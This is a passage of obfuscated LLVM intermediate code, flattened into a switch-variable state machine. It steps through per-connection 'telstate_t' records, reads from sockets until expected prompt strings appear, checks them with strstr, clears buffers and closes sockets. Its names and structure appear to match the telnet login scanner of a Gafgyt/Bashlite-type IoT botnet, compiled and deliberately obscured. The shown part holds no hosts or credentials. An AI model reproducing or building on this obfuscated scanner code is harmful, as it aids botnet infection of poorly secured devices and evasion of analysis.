  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 2
  store i8 0, i8* %1586, align 8
  %1587 = load i32, i32* %2, align 4
  %1588 = sext i32 %1587 to i64
  %.reload159 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload159, i64 %1588
  %1590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1589, i32 0, i32 3
  store i8 0, i8* %1590, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1591:                                   ; preds = %loopEntry
  %1592 = load i32, i32* %2, align 4
  %1593 = sext i32 %1592 to i64
  %.reload158 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload158, i64 %1593
  %1595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1594, i32 0, i32 2
  store i8 7, i8* %1595, align 8
  store i32 -612666132, i32* %switchVar
  br label %loopEnd

; <label>:1596:                                   ; preds = %loopEntry
  %1597 = load i32, i32* %2, align 4
  %1598 = sext i32 %1597 to i64
  %.reload157 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload157, i64 %1598
  %1600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1599, i32 0, i32 8
  %1601 = load i8*, i8** %1600, align 8
  call void @llvm.memset.p0i8.i64(i8* %1601, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1602:                                   ; preds = %loopEntry
  %1603 = load i32, i32* %2, align 4
  %1604 = sext i32 %1603 to i64
  %.reload156 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload156, i64 %1604
  %1606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1605, i32 0, i32 0
  %1607 = load i32, i32* %1606, align 16
  %1608 = load i32, i32* %2, align 4
  %1609 = sext i32 %1608 to i64
  %.reload155 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload155, i64 %1609
  %1611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1610, i32 0, i32 8
  %1612 = load i8*, i8** %1611, align 8
  %1613 = load i32, i32* %2, align 4
  %1614 = sext i32 %1613 to i64
  %.reload154 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload154, i64 %1614
  %1616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1615, i32 0, i32 7
  %1617 = load i16, i16* %1616, align 16
  %1618 = zext i16 %1617 to i32
  %1619 = call i32 @readUntil(i32 %1607, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1612, i32 1024, i32 %1618)
  %1620 = icmp ne i32 %1619, 0
  %1621 = select i1 %1620, i32 -565186089, i32 -52534665
  store i32 %1621, i32* %switchVar
  br label %loopEnd

; <label>:1622:                                   ; preds = %loopEntry
  %1623 = load i32, i32* %2, align 4
  %1624 = sext i32 %1623 to i64
  %.reload153 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload153, i64 %1624
  %1626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1625, i32 0, i32 6
  store i32 0, i32* %1626, align 4
  %1627 = load i32, i32* %2, align 4
  %1628 = sext i32 %1627 to i64
  %.reload152 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload152, i64 %1628
  %1630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1629, i32 0, i32 7
  store i16 0, i16* %1630, align 16
  %1631 = load i32, i32* %2, align 4
  %1632 = sext i32 %1631 to i64
  %.reload151 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload151, i64 %1632
  %1634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1633, i32 0, i32 8
  %1635 = load i8*, i8** %1634, align 8
  %1636 = call i8* @strstr(i8* %1635, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1637 = icmp ne i8* %1636, null
  %1638 = select i1 %1637, i32 -1439678041, i32 1948172069
  store i32 %1638, i32* %switchVar
  br label %loopEnd

; <label>:1639:                                   ; preds = %loopEntry
  %1640 = load i32, i32* %2, align 4
  %1641 = sext i32 %1640 to i64
  %.reload150 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload150, i64 %1641
  %1643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1642, i32 0, i32 8
  %1644 = load i8*, i8** %1643, align 8
  call void @llvm.memset.p0i8.i64(i8* %1644, i8 0, i64 1024, i32 1, i1 false)
  %1645 = load i32, i32* %2, align 4
  %1646 = sext i32 %1645 to i64
  %.reload149 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload149, i64 %1646
  %1648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1647, i32 0, i32 0
  %1649 = load i32, i32* %1648, align 16
  %1650 = call i32 @sclose(i32 %1649)
  %1651 = load i32, i32* %2, align 4
  %1652 = sext i32 %1651 to i64
  %.reload148 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload148, i64 %1652
  %1654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1653, i32 0, i32 2
  store i8 0, i8* %1654, align 8
  %1655 = load i32, i32* %2, align 4
  %1656 = sext i32 %1655 to i64
  %.reload147 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload147, i64 %1656
  %1658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1657, i32 0, i32 3
  store i8 0, i8* %1658, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1659:                                   ; preds = %loopEntry
  %1660 = load i32, i32* %2, align 4
  %1661 = sext i32 %1660 to i64
  %.reload146 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload146, i64 %1661
  %1663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1662, i32 0, i32 2
  store i8 7, i8* %1663, align 8
  store i32 1087488077, i32* %switchVar
  br label %loopEnd

; <label>:1664:                                   ; preds = %loopEntry
  %1665 = load i32, i32* %2, align 4
  %1666 = sext i32 %1665 to i64
  %.reload145 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload145, i64 %1666
  %1668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1667, i32 0, i32 8
  %1669 = load i8*, i8** %1668, align 8
  call void @llvm.memset.p0i8.i64(i8* %1669, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1670:                                   ; preds = %loopEntry
  %1671 = load i32, i32* %2, align 4
  %1672 = sext i32 %1671 to i64
  %.reload144 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload144, i64 %1672
  %1674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1673, i32 0, i32 0
  %1675 = load i32, i32* %1674, align 16
  %1676 = load i32, i32* %2, align 4
  %1677 = sext i32 %1676 to i64
  %.reload143 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload143, i64 %1677
  %1679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1678, i32 0, i32 8
  %1680 = load i8*, i8** %1679, align 8
  %1681 = load i32, i32* %2, align 4
  %1682 = sext i32 %1681 to i64
  %.reload142 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload142, i64 %1682
  %1684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1683, i32 0, i32 7
  %1685 = load i16, i16* %1684, align 16
  %1686 = zext i16 %1685 to i32
  %1687 = call i32 @readUntil(i32 %1675, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1680, i32 1024, i32 %1686)
  %1688 = icmp ne i32 %1687, 0
  %1689 = select i1 %1688, i32 2126149479, i32 -642070141
  store i32 %1689, i32* %switchVar
  br label %loopEnd

; <label>:1690:                                   ; preds = %loopEntry
  %1691 = load i32, i32* %2, align 4
  %1692 = sext i32 %1691 to i64
  %.reload141 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload141, i64 %1692
  %1694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1693, i32 0, i32 6
  store i32 0, i32* %1694, align 4
  %1695 = load i32, i32* %2, align 4
  %1696 = sext i32 %1695 to i64
  %.reload140 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload140, i64 %1696
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1697, i32 0, i32 7
  store i16 0, i16* %1698, align 16
  %1699 = load i32, i32* %2, align 4
  %1700 = sext i32 %1699 to i64
  %.reload139 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload139, i64 %1700
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1701, i32 0, i32 8
  %1703 = load i8*, i8** %1702, align 8
  %1704 = call i8* @strstr(i8* %1703, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1705 = icmp ne i8* %1704, null
  %1706 = select i1 %1705, i32 1969755946, i32 -377429414
  store i32 %1706, i32* %switchVar
  br label %loopEnd

; <label>:1707:                                   ; preds = %loopEntry
  %1708 = load i32, i32* %2, align 4
  %1709 = sext i32 %1708 to i64
  %.reload138 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload138, i64 %1709
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1710, i32 0, i32 8
  %1712 = load i8*, i8** %1711, align 8
  call void @llvm.memset.p0i8.i64(i8* %1712, i8 0, i64 1024, i32 1, i1 false)
  %1713 = load i32, i32* %2, align 4
  %1714 = sext i32 %1713 to i64
  %.reload137 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload137, i64 %1714
  %1716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1715, i32 0, i32 0
  %1717 = load i32, i32* %1716, align 16
  %1718 = call i32 @sclose(i32 %1717)
  %1719 = load i32, i32* %2, align 4
  %1720 = sext i32 %1719 to i64
  %.reload136 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload136, i64 %1720
  %1722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1721, i32 0, i32 2
  store i8 0, i8* %1722, align 8
  %1723 = load i32, i32* %2, align 4
  %1724 = sext i32 %1723 to i64
  %.reload135 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload135, i64 %1724
  %1726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1725, i32 0, i32 3
  store i8 0, i8* %1726, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1727:                                   ; preds = %loopEntry
  %1728 = load i32, i32* %2, align 4
  %1729 = sext i32 %1728 to i64
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload134, i64 %1729
  %1731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1730, i32 0, i32 2
  store i8 7, i8* %1731, align 8
  store i32 -1791654516, i32* %switchVar
  br label %loopEnd

; <label>:1732:                                   ; preds = %loopEntry
  %1733 = load i32, i32* %2, align 4
  %1734 = sext i32 %1733 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %1734
  %1736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1735, i32 0, i32 8
  %1737 = load i8*, i8** %1736, align 8
  call void @llvm.memset.p0i8.i64(i8* %1737, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1738:                                   ; preds = %loopEntry
  %1739 = load i32, i32* %2, align 4
  %1740 = sext i32 %1739 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %1740
  %1742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1741, i32 0, i32 0
  %1743 = load i32, i32* %1742, align 16
  %1744 = load i32, i32* %2, align 4
  %1745 = sext i32 %1744 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %1745
  %1747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1746, i32 0, i32 8
  %1748 = load i8*, i8** %1747, align 8
  %1749 = load i32, i32* %2, align 4
  %1750 = sext i32 %1749 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %1750
  %1752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1751, i32 0, i32 7
  %1753 = load i16, i16* %1752, align 16
  %1754 = zext i16 %1753 to i32
  %1755 = call i32 @readUntil(i32 %1743, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1748, i32 1024, i32 %1754)
  %1756 = icmp ne i32 %1755, 0
  %1757 = select i1 %1756, i32 413542978, i32 -2065938082
  store i32 %1757, i32* %switchVar
  br label %loopEnd

; <label>:1758:                                   ; preds = %loopEntry
  %1759 = load i32, i32* %2, align 4
  %1760 = sext i32 %1759 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %1760
  %1762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1761, i32 0, i32 6
  store i32 0, i32* %1762, align 4
  %1763 = load i32, i32* %2, align 4
  %1764 = sext i32 %1763 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %1764
  %1766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1765, i32 0, i32 7
  store i16 0, i16* %1766, align 16
  %1767 = load i32, i32* %2, align 4
  %1768 = sext i32 %1767 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %1768
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1769, i32 0, i32 8
  %1771 = load i8*, i8** %1770, align 8
  %1772 = call i8* @strstr(i8* %1771, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1773 = icmp ne i8* %1772, null
  %1774 = select i1 %1773, i32 1944280129, i32 -1274926941
  store i32 %1774, i32* %switchVar
  br label %loopEnd

; <label>:1775:                                   ; preds = %loopEntry
  %1776 = load i32, i32* %2, align 4
  %1777 = sext i32 %1776 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %1777
  %1779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1778, i32 0, i32 8
  %1780 = load i8*, i8** %1779, align 8
  call void @llvm.memset.p0i8.i64(i8* %1780, i8 0, i64 1024, i32 1, i1 false)
  %1781 = load i32, i32* %2, align 4
  %1782 = sext i32 %1781 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %1782
  %1784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1783, i32 0, i32 0
  %1785 = load i32, i32* %1784, align 16
  %1786 = call i32 @sclose(i32 %1785)
  %1787 = load i32, i32* %2, align 4
  %1788 = sext i32 %1787 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %1788
  %1790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1789, i32 0, i32 2
  store i8 0, i8* %1790, align 8
  %1791 = load i32, i32* %2, align 4
  %1792 = sext i32 %1791 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %1792
  %1794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1793, i32 0, i32 3
  store i8 0, i8* %1794, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1795:                                   ; preds = %loopEntry
  %1796 = load i32, i32* %2, align 4
  %1797 = sext i32 %1796 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %1797
  %1799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1798, i32 0, i32 2
  store i8 7, i8* %1799, align 8
  store i32 45194861, i32* %switchVar
  br label %loopEnd

; <label>:1800:                                   ; preds = %loopEntry
  %1801 = load i32, i32* %2, align 4
  %1802 = sext i32 %1801 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %1802
  %1804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1803, i32 0, i32 8
  %1805 = load i8*, i8** %1804, align 8
  call void @llvm.memset.p0i8.i64(i8* %1805, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1806:                                   ; preds = %loopEntry
  %1807 = load i32, i32* %2, align 4
  %1808 = sext i32 %1807 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %1808
  %1810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1809, i32 0, i32 0
  %1811 = load i32, i32* %1810, align 16
  %1812 = load i32, i32* %2, align 4
  %1813 = sext i32 %1812 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %1813
  %1815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1814, i32 0, i32 8
  %1816 = load i8*, i8** %1815, align 8
  %1817 = load i32, i32* %2, align 4
  %1818 = sext i32 %1817 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %1818
  %1820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1819, i32 0, i32 7
  %1821 = load i16, i16* %1820, align 16
  %1822 = zext i16 %1821 to i32
  %1823 = call i32 @readUntil(i32 %1811, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1816, i32 1024, i32 %1822)
  %1824 = icmp ne i32 %1823, 0
  %1825 = select i1 %1824, i32 -1500919049, i32 1972843708
  store i32 %1825, i32* %switchVar
  br label %loopEnd

; <label>:1826:                                   ; preds = %loopEntry
  %1827 = load i32, i32* %2, align 4
  %1828 = sext i32 %1827 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %1828
  %1830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1829, i32 0, i32 6
  store i32 0, i32* %1830, align 4
  %1831 = load i32, i32* %2, align 4
  %1832 = sext i32 %1831 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %1832
  %1834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1833, i32 0, i32 7
  store i16 0, i16* %1834, align 16
  %1835 = load i32, i32* %2, align 4
  %1836 = sext i32 %1835 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %1836
  %1838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1837, i32 0, i32 8
  %1839 = load i8*, i8** %1838, align 8
  %1840 = call i8* @strstr(i8* %1839, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1841 = icmp ne i8* %1840, null
  %1842 = select i1 %1841, i32 1762011072, i32 178495681
  store i32 %1842, i32* %switchVar
  br label %loopEnd

; <label>:1843:                                   ; preds = %loopEntry
  %1844 = load i32, i32* %2, align 4
  %1845 = sext i32 %1844 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %1845
  %1847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1846, i32 0, i32 8
  %1848 = load i8*, i8** %1847, align 8
  call void @llvm.memset.p0i8.i64(i8* %1848, i8 0, i64 1024, i32 1, i1 false)
  %1849 = load i32, i32* %2, align 4
  %1850 = sext i32 %1849 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %1850
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1851, i32 0, i32 0
  %1853 = load i32, i32* %1852, align 16
  %1854 = call i32 @sclose(i32 %1853)
  %1855 = load i32, i32* %2, align 4
  %1856 = sext i32 %1855 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %1856
  %1858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1857, i32 0, i32 2
  store i8 0, i8* %1858, align 8
  %1859 = load i32, i32* %2, align 4
  %1860 = sext i32 %1859 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %1860
  %1862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1861, i32 0, i32 3
  store i8 0, i8* %1862, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1863:                                   ; preds = %loopEntry
  %1864 = load i32, i32* %2, align 4
  %1865 = sext i32 %1864 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %1865
  %1867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1866, i32 0, i32 2
  store i8 7, i8* %1867, align 8
  store i32 579562244, i32* %switchVar
  br label %loopEnd

; <label>:1868:                                   ; preds = %loopEntry
  %1869 = load i32, i32* %2, align 4
  %1870 = sext i32 %1869 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %1870
  %1872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1871, i32 0, i32 8
  %1873 = load i8*, i8** %1872, align 8
  call void @llvm.memset.p0i8.i64(i8* %1873, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1874:                                   ; preds = %loopEntry
  %1875 = load i32, i32* %2, align 4
  %1876 = sext i32 %1875 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %1876
  %1878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1877, i32 0, i32 0
  %1879 = load i32, i32* %1878, align 16
  %1880 = load i32, i32* %2, align 4
  %1881 = sext i32 %1880 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %1881
  %1883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1882, i32 0, i32 8
  %1884 = load i8*, i8** %1883, align 8
  %1885 = load i32, i32* %2, align 4
  %1886 = sext i32 %1885 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %1886
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1887, i32 0, i32 7
  %1889 = load i16, i16* %1888, align 16
  %1890 = zext i16 %1889 to i32
  %1891 = call i32 @readUntil(i32 %1879, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1884, i32 1024, i32 %1890)
  %1892 = icmp ne i32 %1891, 0
  %1893 = select i1 %1892, i32 -688004439, i32 -925380061
  store i32 %1893, i32* %switchVar
  br label %loopEnd

; <label>:1894:                                   ; preds = %loopEntry
  %1895 = load i32, i32* %2, align 4
  %1896 = sext i32 %1895 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %1896
  %1898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1897, i32 0, i32 6
  store i32 0, i32* %1898, align 4
  %1899 = load i32, i32* %2, align 4
  %1900 = sext i32 %1899 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %1900
  %1902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1901, i32 0, i32 7
  store i16 0, i16* %1902, align 16
  %1903 = load i32, i32* %2, align 4
  %1904 = sext i32 %1903 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %1904
  %1906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1905, i32 0, i32 8
  %1907 = load i8*, i8** %1906, align 8
  %1908 = call i8* @strstr(i8* %1907, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1909 = icmp ne i8* %1908, null
  %1910 = select i1 %1909, i32 558518064, i32 1202913675
  store i32 %1910, i32* %switchVar
  br label %loopEnd

; <label>:1911:                                   ; preds = %loopEntry
  %1912 = load i32, i32* %2, align 4
  %1913 = sext i32 %1912 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %1913
  %1915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1914, i32 0, i32 8
  %1916 = load i8*, i8** %1915, align 8
  call void @llvm.memset.p0i8.i64(i8* %1916, i8 0, i64 1024, i32 1, i1 false)
  %1917 = load i32, i32* %2, align 4
  %1918 = sext i32 %1917 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
